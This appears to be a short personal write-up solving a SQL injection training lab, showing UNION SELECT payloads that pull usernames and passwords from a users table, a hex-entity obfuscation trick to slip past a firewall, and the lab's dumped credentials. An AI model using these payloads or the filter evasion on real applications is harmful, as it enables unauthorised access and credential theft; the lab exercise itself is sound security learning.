This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

---

**End Goal:** Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

**Analysis:**

1. Vulnerability in its stock check feature.

```php
UNION SELECT NULL, NULL
```

```php
UNION SELECT username || '~' || password  FROM users
```

2. Firewall detects the exploit. I can use obfuscation using hackvertor, which can be installed in the BApp store. 
3. Convert the payload to hex entities by using the right click menu, hackvertor is in extensions. 

![[Pasted image 20240903110439.png]]

```php
wiener~c1zw8sro1r4iy5j1s79d
administrator~oob6s5fotc1frms33kby
carlos~s5zo4kq4ohshgerj9iij
```

---

**Completed:** _11:05 2024-09-03_

